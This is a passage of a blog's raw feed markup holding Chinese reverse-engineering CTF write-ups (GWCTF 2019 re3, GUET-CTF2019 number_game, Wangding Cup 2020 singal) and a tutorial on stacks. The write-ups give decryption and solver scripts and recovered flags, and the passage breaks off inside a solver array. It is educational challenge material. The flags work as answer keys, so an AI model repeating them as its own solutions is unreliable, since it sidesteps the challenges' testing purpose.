class="string">&quot;;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">v4 = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    x1 = keyboard.index(enc[i * <span class="number">4</span>])</span><br><span class="line">    x2 = keyboard.index(enc[i * <span class="number">4</span> + <span class="number">2</span>])</span><br><span class="line">    x3 = keyboard.index(enc[i * <span class="number">4</span> + <span class="number">1</span>])</span><br><span class="line">    x4 = keyboard.index(enc[i * <span class="number">4</span> + <span class="number">3</span>])</span><br><span class="line">    flag.append((x1 &lt;&lt; <span class="number">2</span>) &amp; <span class="number">0xff</span> | ((x2 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x3</span>))</span><br><span class="line">    flag.append(((x2 &amp; <span class="number">0xf</span>) &lt;&lt; <span class="number">4</span>) | (x3 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0xf</span>)</span><br><span class="line">    flag.append(((x3 &amp; <span class="number">0x3</span>) &lt;&lt; <span class="number">6</span>) | x4)</span><br><span class="line"></span><br><span class="line">x1 = keyboard.index(<span class="string">&#x27;k&#x27;</span>)</span><br><span class="line">x2 = keyboard.index(<span class="string">&#x27;C&#x27;</span>)</span><br><span class="line">x3 = keyboard.index(<span class="string">&#x27;w&#x27;</span>)</span><br><span class="line"></span><br><span class="line">flag.append((x1 &lt;&lt; <span class="number">2</span>) &amp; <span class="number">0xff</span> | (x2 &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x3</span>)</span><br><span class="line">flag.append(((x2 &amp; <span class="number">0xf</span>) &lt;&lt; <span class="number">4</span>) | (x3 &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0xf</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line">f1 = flag[<span class="number">0</span>:<span class="number">16</span>]</span><br><span class="line">f2 = flag[<span class="number">16</span>:<span class="number">32</span>]</span><br><span class="line"></span><br><span class="line">rc_init()</span><br><span class="line">rc_decode(f1)</span><br><span class="line">rc_decode(f2)</span><br><span class="line"><span class="built_in">print</span>(f1)</span><br><span class="line"><span class="built_in">print</span>(f2)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    f2[i] ^= flag[i]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f1:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i &amp; <span class="number">0xff</span>), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f2:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(i &amp; <span class="number">0xff</span>), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></div></figure><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Hacking_for_fun@reverser$!&#125;</span><br></pre></td></tr></table></div></figure>]]></content>
      
      
      <categories>
          
          <category> rewp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>GWCTF 2019 re3</title>
      <link href="/2022/09/04/%5BGWCTF%202019%5Dre3/"/>
      <url>/2022/09/04/%5BGWCTF%202019%5Dre3/</url>
      
        <content type="html"><![CDATA[        <h2 id="GWCTF-2019-re3"   >          <a href="#GWCTF-2019-re3" class="heading-link"><i class="fas fa-link"></i></a><a href="#GWCTF-2019-re3" class="headerlink" title="[GWCTF 2019]re3"></a>[GWCTF 2019]re3</h2>      <p>ida64打开</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132204263.png" alt="image-20220904150630604"></p><p>发现有SMC</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132204264.png" alt="image-20220904150656859"></p><p>使用idc脚本解码</p><figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;idc.idc&gt;</span></span></span><br><span class="line"><span class="type">static</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">auto</span> addr = <span class="number">0x402219</span>;</span><br><span class="line">    <span class="keyword">auto</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= <span class="number">223</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        PatchByte(addr+i,Byte(addr+i)^<span class="number">0x99</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>解码后再手动定义函数进行反汇编</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132204265.png" alt="image-20220904150756700"></p><p>分析函数</p><p>sub_40207B</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132204266.png" alt="image-20220904150822204"></p><p>里面的sub_401CF9</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132204267.png" alt="image-20220904150909312"></p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132204268.png" alt="image-20220904150953271"></p><p>有MD5的标志数组加上线性函数</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">F(X,Y,Z) = (X &amp; Y) | ((~X) &amp; Z);</span><br><span class="line">G(X,Y,Z) = (X &amp; Z) | (Y &amp; (~Z));</span><br><span class="line">H(X,Y,Z) = X ^ Y ^ Z;</span><br><span class="line">I(X,Y,Z) = Y ^ (X | (~Z));</span><br></pre></td></tr></table></div></figure><p>判断这是个MD5加密，动调获得结果</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CB8D493521B47A4CC1AE7E62229266</span><br></pre></td></tr></table></div></figure><p>另一个函数则是AES，ECB模式的加密和一个判断</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132204269.png" alt="image-20220904151202296"></p><p>使用python脚本</p><figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">key = long_to_bytes(<span class="number">0xcb8d493521b47a4cc1ae7e62229266ce</span>)</span><br><span class="line">mi = long_to_bytes(<span class="number">0xbc0aadc0147c5ecce0b140bc9c51d52b46b2b9434de5324bad7fb4b39cdb4b5b</span>)</span><br><span class="line">lun = AES.new(key, mode=AES.MODE_ECB)</span><br><span class="line">flag = lun.decrypt(mi)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></div></figure><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;924a9ab2163d390410d0a1f670&#125;</span><br></pre></td></tr></table></div></figure>]]></content>
      
      
      <categories>
          
          <category> rewp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>GUET-CTF2019 number_game</title>
      <link href="/2022/08/12/%5BGUET-CTF2019%5Dnumber_game/"/>
      <url>/2022/08/12/%5BGUET-CTF2019%5Dnumber_game/</url>
      
        <content type="html"><![CDATA[        <h2 id="GUET-CTF2019-number-game"   >          <a href="#GUET-CTF2019-number-game" class="heading-link"><i class="fas fa-link"></i></a><a href="#GUET-CTF2019-number-game" class="headerlink" title="[GUET-CTF2019]number_game"></a>[GUET-CTF2019]number_game</h2>      <p>ida64打开</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132204313.png" alt="image-20220822223502571"></p><p>分析main函数可知，输入经过两次加密后进入到验证环节</p><p>decode1</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132204314.png" alt="image-20220822223646747"></p><p>decode2</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132204315.png" alt="image-20220822223802990"></p><p>可以看出decode1和decode2都是二叉树</p><p>decode1是递归实现的建树的过程，decode2是中序遍历</p><p>看完加密，再去看验证函数</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132204316.png" alt="image-20220822224713833"></p><p>两层0-4的循环，加上[&amp;flag + 5 * i + j]猜测只是个5*5的数组</p><p>进一步分析flag数组里面的内容</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132204317.png" alt="image-20220822224839491"></p><p>最后得出这是个5*5的数独，两个&#x3D;&#x3D;的判断一个是横着的一排无重复，另一个是竖着的一列无重复，然后将这个数独完成后得出加密后的flag就是0421421430</p><p>再逆推最开始的输入</p><p>既然加密只改变输入的顺序，直接动态调试</p><p>修改汇编让check函数失效，输入0123456789</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132204318.png" alt="image-20220822224504923"></p><p>可以看出0123456789已经变成了7381940526</p><p>再将0421421430按照对应关系回填</p><figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;1134240024&#125;</span><br></pre></td></tr></table></div></figure>]]></content>
      
      
      <categories>
          
          <category> rewp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>数据结构--线性表</title>
      <link href="/2022/08/11/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E7%BA%BF%E6%80%A7%E8%A1%A8/"/>
      <url>/2022/08/11/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E7%BA%BF%E6%80%A7%E8%A1%A8/</url>
      
        <content type="html"><![CDATA[        <h1 id="线性表"   >          <a href="#线性表" class="heading-link"><i class="fas fa-link"></i></a><a href="#线性表" class="headerlink" title="线性表"></a>线性表</h1>              <h2 id="栈"   >          <a href="#栈" class="heading-link"><i class="fas fa-link"></i></a><a href="#栈" class="headerlink" title="栈"></a>栈</h2>              <h3 id="什么是栈"   >          <a href="#什么是栈" class="heading-link"><i class="fas fa-link"></i></a><a href="#什么是栈" class="headerlink" title="什么是栈"></a>什么是栈</h3>      <p>栈（stack）是限定仅在表尾进行插入和删除操作的线性表。</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132201275.png" alt="image-20220811213122332"></p><p>LIFO(last in first out)结构</p>        <h3 id="栈的顺序储存结构的实现"   >          <a href="#栈的顺序储存结构的实现" class="heading-link"><i class="fas fa-link"></i></a><a href="#栈的顺序储存结构的实现" class="headerlink" title="栈的顺序储存结构的实现"></a>栈的顺序储存结构的实现</h3>      <p>首先定义一个变量top来指示栈顶，top变量随着数据的入栈和出栈不断的变化。但是变化的范围需要在栈的长度范围之内</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">stack</span>&#123;</span><br><span class="line">    <span class="type">int</span> data[MAXN];</span><br><span class="line">    <span class="type">int</span> top;</span><br><span class="line">&#125;sqstack;</span><br><span class="line"></span><br><span class="line"><span class="built_in">push</span>(stack *s, <span class="type">int</span> x)&#123;</span><br><span class="line">    <span class="keyword">if</span>(s-&gt;top == MAXN - <span class="number">1</span>) <span class="keyword">return</span> ERROR;</span><br><span class="line">    s-&gt;top++;</span><br><span class="line">    s-&gt;data[s-&gt;top] = x;</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">pop</span>(stack *s, <span class="type">int</span> *x)&#123;</span><br><span class="line">    <span class="keyword">if</span>(s-&gt;top == <span class="number">-1</span>) <span class="keyword">return</span> ERROR;</span><br><span class="line">    *x = s-&gt;data[s-&gt;top];</span><br><span class="line">    top--;</span><br><span class="line">  <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure><p>两个栈共享空间</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">stack</span>&#123;</span><br><span class="line"><span class="type">int</span> data[MAXN];</span><br><span class="line">    <span class="type">int</span> top1;</span><br><span class="line">    <span class="type">int</span> top2;</span><br><span class="line">&#125;sqstack;</span><br><span class="line"></span><br><span class="line"><span class="built_in">push</span>(stack *s, <span class="type">int</span> x, <span class="type">int</span> num)&#123;</span><br><span class="line">    <span class="keyword">if</span>(s-&gt;top1 + <span class="number">1</span> == s-&gt;top2) <span class="keyword">return</span> ERROR;</span><br><span class="line">    <span class="keyword">if</span>(num == <span class="number">1</span>)&#123;</span><br><span class="line">        s-&gt;data[++s-&gt;top1] = x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        s-&gt;data[--s-&gt;top2] = x;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">pop</span>(stack *s, <span class="type">int</span> *x, <span class="type">int</span> num)&#123;</span><br><span class="line">    <span class="keyword">if</span>(num == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s-&gt;top1 == <span class="number">-1</span>) <span class="keyword">return</span> ERROR;</span><br><span class="line">        *x = s-&gt;data[s-&gt;top1--];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(s-&gt;top2 == MAXN) <span class="keyword">return</span> ERROR;</span><br><span class="line">        *x = s-&gt;data[s-&gt;top2++];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> OK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>        <h3 id="栈的链式储存结构的实现"   >          <a href="#栈的链式储存结构的实现" class="heading-link"><i class="fas fa-link"></i></a><a href="#栈的链式储存结构的实现" class="headerlink" title="栈的链式储存结构的实现"></a>栈的链式储存结构的实现</h3>              <h3 id="栈的应用"   >          <a href="#栈的应用" class="heading-link"><i class="fas fa-link"></i></a><a href="#栈的应用" class="headerlink" title="栈的应用"></a>栈的应用</h3>              <h4 id="递归"   >          <a href="#递归" class="heading-link"><i class="fas fa-link"></i></a><a href="#递归" class="headerlink" title="递归"></a>递归</h4>      <p>操作系统在执行递归函数的时候，将每层递归函数的局部变量，参数值和返回地址压入栈，腾出寄存器进行下一层递归。在递归结束的退回阶段再将每层的结果出栈。</p>        <h4 id="四则表达式求值"   >          <a href="#四则表达式求值" class="heading-link"><i class="fas fa-link"></i></a><a href="#四则表达式求值" class="headerlink" title="四则表达式求值"></a>四则表达式求值</h4>      <p><strong>后缀（逆波兰）表示法定义</strong></p><p>对于“9+(3-1)×3+10÷2”，用后缀表示法则变为：“9 3 1-3*+10 2&#x2F;+”<br>即所有的符号都是在要运算数字的后面出现。</p><p>规则：从左到右遍历表达式的每个数字和符号，遇到是数字就进栈，遇到是符号，就将处于栈顶两个数字出栈，进行运算，运算结果进栈，一直到最终获得结果。</p><p><strong>中缀表达式转后缀表达式</strong></p><p>规则：从左到右遍历中缀表达式的每个数字和符号，若是数字就输出，即成为后缀表达式的一部分；若是符号，则判断其与栈顶符号的优先级，是右括号或优先级不高于栈顶符号（乘除优先加减）则栈顶元素依次出栈并输出，并将当前符号进栈，一直到最终输出后缀表达式为止。</p>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>网鼎杯 2020 青龙组 singal</title>
      <link href="/2022/08/10/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84%5Dsingal/"/>
      <url>/2022/08/10/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84%5Dsingal/</url>
      
        <content type="html"><![CDATA[        <h2 id="网鼎杯-2020-青龙组-singal"   >          <a href="#网鼎杯-2020-青龙组-singal" class="heading-link"><i class="fas fa-link"></i></a><a href="#网鼎杯-2020-青龙组-singal" class="headerlink" title="[网鼎杯 2020 青龙组]singal"></a>[网鼎杯 2020 青龙组]singal</h2>      <p>一道简单的vm逆向</p><p>打开main函数</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202208102344117.png" alt="image-20220810234443081"></p><p>从unk_403040里面读取数据到v4，再将v4输入到vm_operad里面，也就是虚拟机</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132218860.png"></p><p>分析这个虚拟机可得知，v4是操作码，将v4处理后得到</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> opcode[] = &#123;<span class="number">10</span>, <span class="number">4</span>, <span class="number">16</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>,</span><br><span class="line"><span class="number">32</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">8</span>, </span><br><span class="line"><span class="number">11</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">5</span>,</span><br><span class="line">                <span class="number">3</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">33</span>, <span class="number">1</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">11</span>, </span><br><span class="line">                <span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">32</span>, <span class="number">1</span>, <span class="number">2</span>, </span><br><span class="line">                <span class="number">81</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">36</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">11</span>,</span><br><span class="line">                <span class="number">1</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">37</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">54</span>,</span><br><span class="line">                <span class="number">8</span>, <span class="number">4</span>, <span class="number">65</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">32</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>,</span><br><span class="line">                <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">37</span>, <span class="number">1</span>, <span class="number">4</span>,</span><br><span class="line">                <span class="number">9</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">32</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">65</span>, <span class="number">8</span>,</span><br><span class="line">                <span class="number">12</span>, <span class="number">1</span>, </span><br><span class="line">                <span class="number">7</span>, <span class="number">34</span>, <span class="number">7</span>, <span class="number">63</span>, <span class="number">7</span>, <span class="number">52</span>, <span class="number">7</span>, <span class="number">50</span>,</span><br><span class="line">                <span class="number">7</span>, <span class="number">114</span>, <span class="number">7</span>, <span class="number">51</span>, <span class="number">7</span>, <span class="number">24</span>, <span class="number">7</span>, <span class="number">167</span>,<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,</span><br><span class="line">                <span class="number">7</span>, <span class="number">49</span>, <span class="number">7</span>, <span class="number">241</span>,<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">7</span>, <span class="number">40</span>, <span class="number">7</span>, <span class="number">132</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,</span><br><span class="line">                <span class="number">7</span>, <span class="number">193</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">7</span>, <span class="number">30</span>, <span class="number">7</span>, <span class="number">12</span> &#125;</span><br></pre></td></tr></table></div></figure><p>然后进一步分析handler</p><p><img src="https://raw.githubusercontent.com/745921536/MyImagepost/main/img/202301132218861.png" alt="image-20220810235333597"></p><p>操作码7是程序的对比判断，7后面接的数字是操作数，因为<code>index+=2</code>。</p><p>因此得出加密后的flag就是7后面的操作数</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> flag[] = &#123;<span class="number">34</span>, <span class="number">63</span>, <span class="number">52</span>, <span class="number">50</span>, <span class="number">114</span>, <span class="number">51</span>, <span class="number">24</span>, <span class="number">167</span>, <span class="number">49</span>, <span class="number">241</span>, <span class="number">40</span>, <span class="number">132</span>, <span class="number">193</span>, <span class="number">30</span>, <span class="number">122</span>&#125;;</span><br></pre></td></tr></table></div></figure><p>于是就可以进行编写脚本了，注意区分操作数和操作码</p><p>当然也可以先正向跑一遍来获取整个操作的顺序，因为这道题的操作码执行顺序与输入无关</p><figure class="highlight c++"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> opcode[] = &#123;<span class="number">10</span>, <span class="number">4</span>, <span class="number">16</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>,</span><br><span class="line"><span class="number">32</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">8</span>, </span><br><span class="line"><span class="number">11</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">5</span>,</span><br><span class="line">                <span class="number">3</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">33</span>, <span class="number">1</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">11</span>, </span><br><span class="line">                <span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">32</span>, <span class="number">1</span>, <span class="number">2</span>, </span><br><span class="line">                <span class="number">81</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">36</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">11</span>,</span><br><span class="line">                <span class="number">1</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">37</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">54</span>,</span><br><span class="line">                <span class="number">8</span>, <span class="number">4</span>, <span class="number">65</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">32</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>,</span><br><span class="line">                <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">37</span>, <span class="number">1</span>, <span class="number">4</span>,</span><br><span class="line">                <span class="number">9</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">32</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">65</span>, <span class="number">8</span>,</span><br><span class="line">                <span class="number">12</span>, <span class="number">1</span>, </span><br><span class="line">                <span class="number">7</span>, <span class="number">34</span>, <span class="number">7</span>, <span class="number">63</span>, <span class="number">7</span>, <span class="number">52</span>, <span class="number">7</span>, <span class="number">50</span>,</span><br><span class="line">                <span class="number">7</span>, <span class="number">114</span>, <span class="number">7</span>, <span class="number">51</span>, <span class="number">7</span>, <span class="number">24</span>, <span class="number">7</span>, <span class="number">167</span>,<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,</span><br><span class="line">                <span class="number">7</span>, <span class="number">49</span>, <span class="number">7</span>, <span class="number">241</span>,<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">7</span>, <span class="number">40</span>, <span class="number">7</span>, <span class="number">132</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>,</span><br><span class="line">                <span class="number">7</span>, <span class="number">193</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>, <span class="number">7</span>, <span class="number">30</span>, <span class="number">7</span>, <span class="number">12</span> &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> order[<span class="number">100</span>] = &#123;<span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>, <span class="number">20</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">26</span>, <span class="number">28</span>, <span class="number">29</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">32</span>, <span class="number">33</span>, <span class="number">35</span>, <span class="number">36</span>, <span class="number">38</span>, <span class="number">39</span>, <span class="number">41</span>, <span class="number">42</span>, <span class="number">44</span>, <span class="number">45</span>, <span class="number">46</span>, <span class="number">47</span>, <span class="number">48</span>, <span class="number">49</span>, <span class="number">51</span>, <span class="number">52</span>, <span class="number">54</span>, <span class="number">55</span>, <span class="number">57</span>, <span class="number">58</span>, <span class="number">60</span>, <span class="number">61</span>, <span class="number">63</span>, <span class="number">64</span>, <span class="number">66</span>, <span class="number">67</span>, <span class="number">69</span>, <span class="number">70</span>, <span class="number">72</span>, <span class="number">73</span>, <span class="number">75</span>, <span class="number">76</span>, <span class="number">78</span>, <span class="number">79</span>, <span class="number">81</span>, <span class="number">82</span>, <span class="number">83</span>, <span class="number">84</span>, <span class="number">86</span>, <span class="number">88</span>, <span class="number">90</span>, <span class="number">92</span>, <span class="number">94</span>, <span class="number">96</span>, <span class="number">98</span>, <span class="number">100</span>, <span class="number">102</span>, <span class="number">104</span>, <span class="number">106</span>, 